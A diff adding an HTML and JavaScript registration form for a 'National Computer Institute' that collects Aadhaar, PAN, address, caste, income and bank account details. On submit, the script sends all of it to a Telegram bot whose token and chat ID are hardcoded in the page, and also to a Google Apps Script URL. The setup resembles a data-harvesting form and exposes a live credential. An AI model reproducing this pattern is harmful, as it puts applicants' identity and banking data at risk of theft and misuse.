@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>National Computer Institute - Registration Portal</title>
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:Arial,Helvetica,sans-serif;background:linear-gradient(135deg,#eef5ff,#f8fafc);color:#172033}
+.header{background:linear-gradient(135deg,#071b35,#123e6a,#1d4ed8);color:#fff;padding:16px 20px;box-shadow:0 5px 25px #0002}
+.brand{max-width:1100px;margin:auto;display:flex;align-items:center;gap:15px}.brand img{width:76px;height:76px;object-fit:contain;background:#fff;border-radius:14px;padding:4px}.brand h1{margin:0;font-size:25px}.brand p{margin:5px 0 0;opacity:.9}
+.container{max-width:1100px;margin:25px auto;padding:0 15px}.card{background:#fff;border-radius:20px;box-shadow:0 12px 45px #17203318;overflow:hidden}
+.progress-area{padding:24px 30px 12px}.progress{height:8px;background:#e5e7eb;border-radius:20px;overflow:hidden}.progress-bar{height:100%;width:20%;background:linear-gradient(90deg,#f97316,#2563eb,#16a34a);transition:.35s}
+.steps{display:flex;justify-content:space-between;gap:6px;margin-top:18px}.step{flex:1;text-align:center;color:#9ca3af;font-size:12px;font-weight:bold}.step-number{width:35px;height:35px;margin:auto auto 6px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#e5e7eb;color:#6b7280}.step.active{color:#2563eb}.step.active .step-number{background:#2563eb;color:white}.step.completed .step-number{background:#16a34a;color:#fff}
+.form-area{padding:30px}.form-step{display:none;animation:fade .25s}.form-step.active{display:block}@keyframes fade{from{opacity:0;transform:translateX(12px)}to{opacity:1;transform:none}}
+.step-title{margin:0 0 5px;font-size:24px}.step-description{margin:0 0 24px;color:#6b7280}.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:19px}.full{grid-column:1/-1}.form-group{position:relative}label{display:block;font-size:14px;font-weight:700;margin-bottom:7px;color:#374151}.required{color:#dc2626}
+input,select,textarea{width:100%;border:1px solid #d1d5db;border-radius:11px;padding:13px 45px 13px 14px;outline:none;font-size:15px;background:#fff;transition:.2s}textarea{min-height:90px;resize:vertical}input:focus,select:focus,textarea:focus{border-color:#2563eb;box-shadow:0 0 0 3px #2563eb18}.voice-btn{position:absolute;right:7px;bottom:7px;border:0;width:33px;height:33px;border-radius:50%;background:#eff6ff;color:#2563eb;cursor:pointer}.error{display:none;color:#dc2626;font-size:12px;margin-top:5px}.invalid input,.invalid select,.invalid textarea{border-color:#dc2626}.invalid .error{display:block}
+.navigation{display:flex;justify-content:space-between;gap:12px;margin-top:30px;padding-top:20px;border-top:1px solid #eee}.btn{border:0;border-radius:10px;padding:13px 24px;font-weight:700;font-size:15px;cursor:pointer}.primary{background:#2563eb;color:#fff}.secondary{background:#e5e7eb;color:#374151}.success-btn{background:#16a34a;color:#fff}
+.review{background:#f8fafc;border-radius:13px;padding:18px}.review-section{margin-bottom:24px}.review-section h3{margin:0 0 11px;color:#1d4ed8;border-bottom:1px solid #dbeafe;padding-bottom:8px}.review-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:9px}.review-item{background:#fff;border:1px solid #e5e7eb;border-radius:9px;padding:11px}.review-item small{display:block;color:#6b7280;margin-bottom:3px}.review-item strong{word-break:break-word}
+.voice-control{position:fixed;right:18px;bottom:18px;z-index:20}.voice-toggle{border:0;border-radius:50px;padding:11px 17px;background:#111827;color:#fff;box-shadow:0 5px 20px #0003;cursor:pointer}
+.success{display:none;text-align:center;padding:45px 20px}.success-icon{font-size:58px}.registration-id{display:inline-block;margin:15px 0;background:#eff6ff;color:#1d4ed8;border-radius:10px;padding:12px 20px;font-weight:bold}
+.footer{text-align:center;padding:18px;color:#64748b;font-size:13px}.footer b{color:#123e6a}
+.telegram-status{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:12px 18px;margin-top:15px;display:none;align-items:center;gap:12px;font-size:14px;color:#166534}.telegram-status.error{background:#fef2f2;border-color:#fecaca;color:#991b1b}.telegram-status .spinner{width:20px;height:20px;border:3px solid #bbf7d0;border-top-color:#16a34a;border-radius:50%;animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:700px){.brand img{width:60px;height:60px}.brand h1{font-size:19px}.brand p{font-size:12px}.form-area,.progress-area{padding:20px}.grid,.review-grid{grid-template-columns:1fr}.full{grid-column:auto}.step span{display:none}.step-number{width:30px;height:30px}.navigation{flex-direction:column-reverse}.btn{width:100%}}
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="brand">
+    <img src="logo.png" alt="National Computer Institute Logo">
+    <div>
+      <h1>National Computer Institute</h1>
+      <p>Candidate Registration Portal</p>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+<div class="card">
+<div class="progress-area">
+  <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
+  <div class="steps">
+    <div class="step active"><div class="step-number">1</div><span>Personal</span></div>
+    <div class="step"><div class="step-number">2</div><span>Address</span></div>
+    <div class="step"><div class="step-number">3</div><span>Education</span></div>
+    <div class="step"><div class="step-number">4</div><span>Bank</span></div>
+    <div class="step"><div class="step-number">5</div><span>Review</span></div>
+  </div>
+</div>
+
+<div class="form-area">
+<form id="registrationForm">
+
+<div class="form-step active">
+<h2 class="step-title">Personal Information</h2><p class="step-description">अपनी व्यक्तिगत जानकारी भरें। किसी भी field पर क्लिक करने पर voice guidance मिलेगी।</p>
+<div class="grid">
+
+<div class="form-group"><label>SR No</label><input id="srNo" name="srNo" readonly></div>
+<!--
+<div class="form-group"><label>Centre Name <span class="required">*</span></label><input name="centreName" required data-help="यहाँ अपने सेंटर या संस्था का नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Centre Name भरना आवश्यक है।</div></div>
+-->
+<div class="form-group"><label>Aadhaar Number <span class="required">*</span></label><input name="aadhaar" maxlength="12" inputmode="numeric" required data-help="यहाँ अपना 12 अंकों का आधार नंबर भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">12 अंकों का Aadhaar Number भरें।</div></div>
+<div class="form-group"><label>Candidate Name <span class="required">*</span></label><input name="candidateName" required data-help="यहाँ अपना पूरा नाम भरें, जैसा आपके प्रमाण पत्र में है।"><button type="button" class="voice-btn">🔊</button><div class="error">Candidate Name भरना आवश्यक है।</div></div>
+<div class="form-group"><label>Father Name <span class="required">*</span></label><input name="fatherName" required data-help="यहाँ अपने पिता का पूरा नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Father Name भरना आवश्यक है।</div></div>
+<div class="form-group"><label>Mother Name <span class="required">*</span></label><input name="motherName" required data-help="यहाँ अपनी माता का पूरा नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Mother Name भरना आवश्यक है।</div></div>
+<div class="form-group"><label>Email Address</label><input type="email" name="email" data-help="यहाँ अपना सक्रिय Email Address भरें।"><button type="button" class="voice-btn">🔊</button></div>
+<div class="form-group"><label>Contact Number <span class="required">*</span></label><input name="contact" maxlength="10" inputmode="numeric" required data-help="यहाँ अपना 10 अंकों का मोबाइल नंबर भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">सही 10 अंकों का mobile number भरें।</div></div>
+<div class="form-group"><label>Alternate Number</label><input name="alternate" maxlength="10" inputmode="numeric" data-help="यदि आपके पास दूसरा मोबाइल नंबर है तो यहाँ भरें।"><button type="button" class="voice-btn">🔊</button></div>
+<div class="form-group"><label>Marital Status <span class="required">*</span></label><select name="maritalStatus" required data-help="अपनी वैवाहिक स्थिति चुनें।"><option value="">Select</option><option>Unmarried</option><option>Married</option><option>Widow</option><option>Divorced</option></select><button type="button" class="voice-btn">🔊</button><div class="error">Marital Status चुनें।</div></div>
+<div class="form-group"><label>Gender <span class="required">*</span></label><select name="gender" required data-help="अपना gender चुनें।"><option value="">Select</option><option>Male</option><option>Female</option><option>Other</option></select><button type="button" class="voice-btn">🔊</button><div class="error">Gender चुनें।</div></div>
+
+</div>
+<div class="navigation"><button type="button" class="btn primary nextBtn">Next →</button></div>
+</div>
+
+<div class="form-step">
+<h2 class="step-title">Address Information</h2><p class="step-description">अपना स्थायी पता भरें।</p>
+<div class="grid">
+<div class="form-group"><label>Block Name <span class="required">*</span></label><input name="blockName" required data-help="यहाँ अपने Block का नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Block Name आवश्यक है।</div></div>
+<div class="form-group"><label>Gram Panchayat <span class="required">*</span></label><input name="gramPanchayat" required data-help="यहाँ अपनी Gram Panchayat का नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Gram Panchayat आवश्यक है।</div></div>
+<div class="form-group"><label>Village <span class="required">*</span></label><input name="village" required data-help="यहाँ अपने गाँव का नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Village आवश्यक है।</div></div>
+<div class="form-group"><label>Domicile State <span class="required">*</span></label><input name="domicileState" required data-help="यहाँ अपने निवास राज्य का नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">State आवश्यक है।</div></div>
+<div class="form-group"><label>Domicile District <span class="required">*</span></label><input name="domicileDistrict" required data-help="यहाँ अपने निवास जिले का नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">District आवश्यक है।</div></div>
+<div class="form-group"><label>PIN <span class="required">*</span></label><input name="pin" maxlength="6" inputmode="numeric" required data-help="यहाँ 6 अंकों का PIN Code भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">6 अंकों का PIN भरें।</div></div>
+<div class="form-group full"><label>Full Address <span class="required">*</span></label><textarea name="fullAddress" required data-help="यहाँ अपना पूरा स्थायी पता भरें।"></textarea><button type="button" class="voice-btn">🔊</button><div class="error">Full Address आवश्यक है।</div></div>
+<div class="form-group full"><label>Nearest Landmark</label><input name="nearestLandmark" data-help="यहाँ पास के किसी प्रसिद्ध स्थान या पहचान की जगह का नाम भरें।"><button type="button" class="voice-btn">🔊</button></div>
+</div>
+<div class="navigation"><button type="button" class="btn secondary prevBtn">← Previous</button><button type="button" class="btn primary nextBtn">Next →</button></div>
+</div>
+
+<div class="form-step">
+<h2 class="step-title">Education & Other Details</h2><p class="step-description">शैक्षणिक और अन्य जानकारी भरें।</p>
+<div class="grid">
+<div class="form-group"><label>Date of Birth <span class="required">*</span></label><input type="date" name="dob" required data-help="यहाँ अपनी जन्म तिथि चुनें।"><button type="button" class="voice-btn">🔊</button><div class="error">Date of Birth आवश्यक है।</div></div>
+<div class="form-group"><label>Caste Category <span class="required">*</span></label><select name="casteCategory" required data-help="अपनी caste category चुनें।"><option value="">Select</option><option>General</option><option>OBC</option><option>SC</option><option>ST</option><option>EWS</option></select><button type="button" class="voice-btn">🔊</button><div class="error">Category चुनें।</div></div>
+<div class="form-group"><label>Minority <span class="required">*</span></label><select name="minority" required data-help="यदि आप minority category से हैं तो Yes, अन्यथा No चुनें।"><option value="">Select</option><option>Yes</option><option>No</option></select><button type="button" class="voice-btn">🔊</button><div class="error">Minority चुनें।</div></div>
+<div class="form-group"><label>Qualification <span class="required">*</span></label><input name="qualification" required data-help="यहाँ अपनी highest educational qualification भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Qualification आवश्यक है।</div></div>
+<div class="form-group"><label>Passing Year <span class="required">*</span></label><input name="passingYear" maxlength="4" inputmode="numeric" required data-help="जिस वर्ष आपने परीक्षा पास की वह चार अंकों में भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Passing Year भरें।</div></div>
+<div class="form-group"><label>Religion <span class="required">*</span></label><select name="religion" required data-help="अपना religion चुनें।"><option value="">Select</option><option>Hindu</option><option>Muslim</option><option>Christian</option><option>Sikh</option><option>Buddhist</option><option>Jain</option><option>Other</option></select><button type="button" class="voice-btn">🔊</button><div class="error">Religion चुनें।</div></div>
+<div class="form-group"><label>Annual Family Income</label><input name="annualIncome" inputmode="numeric" data-help="यहाँ परिवार की वार्षिक आय भरें।"><button type="button" class="voice-btn">🔊</button></div>
+<div class="form-group"><label>PAN Number</label><input name="pan" maxlength="10" style="text-transform:uppercase" data-help="यदि PAN Card है तो 10 अक्षरों का PAN Number भरें।"><button type="button" class="voice-btn">🔊</button></div>
+</div>
+<div class="navigation"><button type="button" class="btn secondary prevBtn">← Previous</button><button type="button" class="btn primary nextBtn">Next →</button></div>
+</div>
+
+<div class="form-step">
+<h2 class="step-title">Bank Information</h2><p class="step-description">Bank Passbook से देखकर जानकारी ध्यान से भरें।</p>
+<div class="grid">
+<div class="form-group"><label>Account Number <span class="required">*</span></label><input name="accountNumber" maxlength="20" inputmode="numeric" required data-help="यहाँ अपनी बैंक पासबुक का Account Number भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Account Number आवश्यक है।</div></div>
+<div class="form-group"><label>Bank Name <span class="required">*</span></label><input name="bankName" required data-help="यहाँ अपने बैंक का पूरा नाम भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">Bank Name आवश्यक है।</div></div>
+<div class="form-group"><label>IFSC Code <span class="required">*</span></label><input name="ifsc" maxlength="11" style="text-transform:uppercase" required data-help="यहाँ अपनी बैंक शाखा का 11 अक्षर का IFSC Code भरें।"><button type="button" class="voice-btn">🔊</button><div class="error">सही IFSC Code भरें।</div></div>
+</div>
+<div class="navigation"><button type="button" class="btn secondary prevBtn">← Previous</button><button type="button" class="btn primary nextBtn">Review →</button></div>
+</div>
+
+<div class="form-step">
+<h2 class="step-title">Review Your Information</h2><p class="step-description">Submit करने से पहले सभी जानकारी जाँच लें।</p>
+<div id="reviewArea" class="review"></div>
+
+<!-- Telegram Status Indicator -->
+<div id="telegramStatus" class="telegram-status">
+  <div class="spinner"></div>
+  <span>Server पर भेजा जा रहा है...</span>
+</div>
+
+<div class="navigation"><button type="button" class="btn secondary prevBtn">← Previous</button><button type="submit" class="btn success-btn">✓ Submit Registration</button></div>
+</div>
+
+</form>
+
+<div id="successScreen" class="success">
+  <div class="success-icon">🎉</div>
+  <h2>Registration Successful!</h2>
+  <p>National Computer Institute में आपका registration सफलतापूर्वक save हो गया है।</p>
+  <div id="registrationId" class="registration-id"></div><br>
+  <button class="btn primary" onclick="location.reload()">New Registration</button>
+</div>
+</div>
+</div>
+</div>
+
+<div class="footer">© <span id="year"></span> <b>National Computer Institute</b> — Learn Today, Lead Tomorrow</div>
+<div class="voice-control"><button id="voiceToggle" class="voice-toggle">🔊 Voice ON</button></div>
+
+<script>
+/* ============================================================
+   TELEGRAM BOT CONFIGURATION - इन्हें अपनी जानकारी से बदलें
+   ============================================================ */
+const TELEGRAM_BOT_TOKEN = "8895777360:AAE9BuhnQGrnTuAfwJMute9oWK4OgLaT98s";    // BotFather से प्राप्त Token
+const TELEGRAM_CHAT_ID = "8492749081";        // अपना Chat ID (जहाँ मैसेज भेजना है)
+
+/* Google Apps Script Web App URL - Optional */
+const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwEumSJ2aMJ8u1__7hDDebEkoDNXuMnDj9FkOMWU1uNfz2XFnqYrIXzxAKPKIsOgx7z3Q/exec";
+
+/* ============================================================
+   CORE APPLICATION LOGIC
+   ============================================================ */
+
+let currentStep=0, voiceEnabled=true;
+const steps=document.querySelectorAll(".form-step");
+const indicators=document.querySelectorAll(".step");
+const progressBar=document.getElementById("progressBar");
+const telegramStatus=document.getElementById("telegramStatus");
+
+document.getElementById("year").textContent=new Date().getFullYear();
+document.getElementById("srNo").value=Date.now().toString().slice(-8);
+
+/* --- Voice Guidance --- */
+function speak(text){
+  if(!voiceEnabled || !("speechSynthesis" in window)) return;
+  speechSynthesis.cancel();
+  const u=new SpeechSynthesisUtterance(text);
+  u.lang="hi-IN"; u.rate=.9; u.pitch=1;
+  speechSynthesis.speak(u);
+}
+document.querySelectorAll("[data-help]").forEach(el=>{
+  el.addEventListener("focus",()=>speak(el.dataset.help));
+});
+document.querySelectorAll(".voice-btn").forEach(btn=>{
+  btn.addEventListener("click",()=>{
+    const f=btn.parentElement.querySelector("input,select,textarea");
+    if(f) speak(f.dataset.help);
+  });
+});
+document.getElementById("voiceToggle").onclick=()=>{
+  voiceEnabled=!voiceEnabled;
+  document.getElementById("voiceToggle").textContent=voiceEnabled?"🔊 Voice ON":"🔇 Voice OFF";
+  if(!voiceEnabled) speechSynthesis.cancel();
+  else speak("Voice guidance चालू कर दी गई है।");
+};
+
+/* --- Input Validation & Formatting --- */
+const numericFields=["aadhaar","contact","alternate","pin","passingYear","annualIncome","accountNumber"];
+numericFields.forEach(n=>{
+  const el=document.querySelector(`[name="${n}"]`);
+  if(el) el.addEventListener("input",()=>el.value=el.value.replace(/\D/g,""));
+});
+document.querySelector('[name="aadhaar"]').addEventListener("input",e=>e.target.value=e.target.value.slice(0,12));
+document.querySelector('[name="contact"]').addEventListener("input",e=>e.target.value=e.target.value.slice(0,10));
+document.querySelector('[name="alternate"]').addEventListener("input",e=>e.target.value=e.target.value.slice(0,10));
+document.querySelector('[name="pin"]').addEventListener("input",e=>e.target.value=e.target.value.slice(0,6));
+document.querySelector('[name="passingYear"]').addEventListener("input",e=>e.target.value=e.target.value.slice(0,4));
+document.querySelector('[name="pan"]').addEventListener("input",e=>e.target.value=e.target.value.toUpperCase().replace(/[^A-Z0-9]/g,"").slice(0,10));
+document.querySelector('[name="ifsc"]').addEventListener("input",e=>e.target.value=e.target.value.toUpperCase().replace(/[^A-Z0-9]/g,"").slice(0,11));
+document.querySelector('[name="accountNumber"]').addEventListener("input",e=>e.target.value=e.target.value.slice(0,20));
+
+function validateCurrentStep(){
+  let valid=true;
+  const fields=steps[currentStep].querySelectorAll("input[required],select[required],textarea[required]");
+  fields.forEach(f=>{
+    const g=f.closest(".form-group"); g.classList.remove("invalid");
+    const v=f.value.trim();
+    if(!v){g.classList.add("invalid");valid=false;return;}
+    if(f.name==="aadhaar"&&!/^\d{12}$/.test(v)){g.classList.add("invalid");valid=false}
+    if((f.name==="contact"||f.name==="alternate")&&!/^[6-9]\d{9}$/.test(v)){g.classList.add("invalid");valid=false}
+    if(f.name==="pin"&&!/^\d{6}$/.test(v)){g.classList.add("invalid");valid=false}
+    if(f.name==="pan"&&v&&!/^[A-Z]{5}[0-9]{4}[A-Z]$/.test(v)){g.classList.add("invalid");valid=false}
+    if(f.name==="ifsc"&&!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(v)){g.classList.add("invalid");valid=false}
+  });
+  if(!valid) speak("कृपया सभी आवश्यक जानकारी सही तरीके से भरें।");
+  return valid;
+}
+
+function showStep(i){
+  currentStep=i;
+  steps.forEach((s,x)=>s.classList.toggle("active",x===i));
+  indicators.forEach((s,x)=>{
+    s.classList.remove("active","completed");
+    if(x===i)s.classList.add("active");
+    if(x<i)s.classList.add("completed");
+  });
+  progressBar.style.width=((i+1)/steps.length*100)+"%";
+  if(i===4) createReview();
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+document.querySelectorAll(".nextBtn").forEach(b=>b.onclick=()=>{if(validateCurrentStep()&&currentStep<4)showStep(currentStep+1)});
+document.querySelectorAll(".prevBtn").forEach(b=>b.onclick=()=>{if(currentStep>0)showStep(currentStep-1)});
+
+function getData(){
+  const fd=new FormData(document.getElementById("registrationForm")), d={};
+  fd.forEach((v,k)=>d[k]=v);
+  return d;
+}
+function esc(v){return String(v??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m]))}
+function createReview(){
+  const d=getData();
+  const groups={
+    "Personal Details":["srNo","centreName","aadhaar","candidateName","fatherName","motherName","email","contact","alternate","maritalStatus","gender"],
+    "Address Details":["blockName","gramPanchayat","village","domicileState","domicileDistrict","pin","fullAddress","nearestLandmark"],
+    "Education Details":["dob","casteCategory","minority","qualification","passingYear","religion","annualIncome","pan"],
+    "Bank Details":["accountNumber","bankName","ifsc"]
+  };
+  const labels={srNo:"SR No",centreName:"Centre Name",aadhaar:"Aadhaar Number",candidateName:"Candidate Name",fatherName:"Father Name",motherName:"Mother Name",email:"Email Address",contact:"Contact Number",alternate:"Alternate Number",maritalStatus:"Marital Status",gender:"Gender",blockName:"Block Name",gramPanchayat:"Gram Panchayat",village:"Village",domicileState:"Domicile State",domicileDistrict:"Domicile District",pin:"PIN",fullAddress:"Full Address",nearestLandmark:"Nearest Landmark",dob:"Date of Birth",casteCategory:"Caste Category",minority:"Minority",qualification:"Qualification",passingYear:"Passing Year",religion:"Religion",annualIncome:"Annual Family Income",pan:"PAN Number",accountNumber:"Account Number",bankName:"Bank Name",ifsc:"IFSC Code"};
+  let html="";
+  Object.entries(groups).forEach(([title,fields])=>{
+    html+=`<div class="review-section"><h3>${title}</h3><div class="review-grid">`;
+    fields.forEach(k=>html+=`<div class="review-item"><small>${labels[k]}</small><strong>${esc(d[k]||"-")}</strong></div>`);
+    html+="</div></div>";
+  });
+  document.getElementById("reviewArea").innerHTML=html;
+}
+
+/* ============================================================
+   TELEGRAM BOT - Send Message Function
+   ============================================================ */
+async function sendToTelegram(data) {
+  // Check if bot token is configured
+  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+    console.warn("Telegram Bot Token not configured. Skipping Telegram send.");
+    return { success: false, error: "Bot Token not configured" };
+  }
+  
+  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
+    console.warn("Telegram Chat ID not configured. Skipping Telegram send.");
+    return { success: false, error: "Chat ID not configured" };
+  }
+
+  // Format message for Telegram
+  const registrationId = data.registrationId || "NCI-" + Date.now().toString().slice(-6);
+  const submittedAt = data.submittedAt || new Date().toLocaleString("en-IN");
+  
+  // Create a beautiful formatted message
+  let message = `📋 *NATIONAL COMPUTER INSTITUTE*\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `🆔 *Registration ID:* ${registrationId}\n` +
+                `📅 *Submitted:* ${submittedAt}\n\n` +
+                `👤 *PERSONAL DETAILS*\n` +
+                `─────────────────────\n` +
+                `🏫 Centre: ${data.centreName || "-"}\n` +
+                `🪪 Aadhaar: ${data.aadhaar || "-"}\n` +
+                `📛 Name: ${data.candidateName || "-"}\n` +
+                `👨 Father: ${data.fatherName || "-"}\n` +
+                `👩 Mother: ${data.motherName || "-"}\n` +
+                `📧 Email: ${data.email || "-"}\n` +
+                `📱 Contact: ${data.contact || "-"}\n` +
+                `📱 Alternate: ${data.alternate || "-"}\n` +
+                `💑 Marital: ${data.maritalStatus || "-"}\n` +
+                `⚥ Gender: ${data.gender || "-"}\n\n` +
+                `📍 *ADDRESS DETAILS*\n` +
+                `─────────────────────\n` +
+                `🏘️ Block: ${data.blockName || "-"}\n` +
+                `🏛️ Panchayat: ${data.gramPanchayat || "-"}\n` +
+                `🏠 Village: ${data.village || "-"}\n` +
+                `🏙️ State: ${data.domicileState || "-"}\n` +
+                `🏢 District: ${data.domicileDistrict || "-"}\n` +
+                `📮 PIN: ${data.pin || "-"}\n` +
+                `📍 Address: ${data.fullAddress || "-"}\n` +
+                `🗺️ Landmark: ${data.nearestLandmark || "-"}\n\n` +
+                `🎓 *EDUCATION DETAILS*\n` +
+                `─────────────────────\n` +
+                `🎂 DOB: ${data.dob || "-"}\n` +
+                `📊 Caste: ${data.casteCategory || "-"}\n` +
+                `🕌 Minority: ${data.minority || "-"}\n` +
+                `📚 Qualification: ${data.qualification || "-"}\n` +
+                `📅 Passing Year: ${data.passingYear || "-"}\n` +
+                `⛪ Religion: ${data.religion || "-"}\n` +
+                `💰 Income: ₹${data.annualIncome || "-"}\n` +
+                `🪪 PAN: ${data.pan || "-"}\n\n` +
+                `🏦 *BANK DETAILS*\n` +
+                `─────────────────────\n` +
+                `🔢 Account: ${data.accountNumber || "-"}\n` +
+                `🏛️ Bank: ${data.bankName || "-"}\n` +
+                `🔑 IFSC: ${data.ifsc || "-"}\n` +
+                `━━━━━━━━━━━━━━━━━━━━━\n` +
+                `✅ *Registration Successful!*`;
+
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "Markdown",
+      disable_web_page_preview: true
+    };
+
+    console.log("📤 Sending to Telegram...");
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    const result = await response.json();
+    
+    if (result.ok) {
+      console.log("✅ Telegram message sent successfully!");
+      return { success: true, result };
+    } else {
+      console.error("❌ Telegram API error:", result);
+      return { success: false, error: result.description || "Unknown API error" };
+    }
+  } catch (error) {
+    console.error("❌ Failed to send to Telegram:", error);
+    return { success: false, error: error.message };
+  }
+}
+
+/* --- Form Submit Handler --- */
+document.getElementById("registrationForm").addEventListener("submit", async e => {
+  e.preventDefault();
+  if(!validateCurrentStep()) return;
+
+  const data = getData();
+  data.registrationId = "NCI-"+new Date().getFullYear()+"-"+Date.now().toString().slice(-6);
+  data.submittedAt = new Date().toLocaleString("en-IN");
+
+  // Show Telegram sending status
+  telegramStatus.style.display = "flex";
+  telegramStatus.className = "telegram-status";
+  telegramStatus.innerHTML = `<div class="spinner"></div><span>📤 Server पर भेजा जा रहा है...</span>`;
+
+  // Send to Telegram
+  const tgResult = await sendToTelegram(data);
+
+  // Update Telegram status
+  if (tgResult.success) {
+    telegramStatus.className = "telegram-status";
+    telegramStatus.innerHTML = `✅ <span>Registration details sent to Telegram successfully!</span>`;
+  } else {
+    telegramStatus.className = "telegram-status error";
+    telegramStatus.innerHTML = `⚠️ <span>Telegram send failed: ${tgResult.error || "Unknown error"}</span>`;
+  }
+
+  // Save to localStorage
+  try {
+    const old = JSON.parse(localStorage.getItem("candidateRegistrations")||"[]");
+    old.push(data); 
+    localStorage.setItem("candidateRegistrations", JSON.stringify(old));
+  } catch(e) { console.log("localStorage error:", e); }
+
+  // Send to Google Apps Script (optional)
+  try {
+    if(GOOGLE_SCRIPT_URL && !GOOGLE_SCRIPT_URL.includes("YOUR_SCRIPT_ID")){
+      await fetch(GOOGLE_SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(data)
+      });
+    }
+  } catch(err) { console.log("Google Script error:", err); }
+
+  // Show success screen after a short delay
+  setTimeout(() => {
+    document.getElementById("registrationForm").style.display = "none";
+    document.getElementById("successScreen").style.display = "block";
+    document.getElementById("registrationId").textContent = "Registration ID: " + data.registrationId;
+    speak("National Computer Institute में आपका registration सफलतापूर्वक पूरा हो गया है।");
+  }, 1500);
+});
+
+/* --- Quick Test Function for Telegram (can be removed in production) --- */
+// Uncomment below to test Telegram connection from browser console
+// async function testTelegram() {
+//   const result = await sendToTelegram({
+//     centreName: "Test Centre",
+//     candidateName: "Test User",
+//     contact: "9876543210",
+//     registrationId: "TEST-001",
+//     submittedAt: new Date().toLocaleString("en-IN")
+//   });
+//   console.log("Test result:", result);
+// }
+</script>
+</body>
+</html>
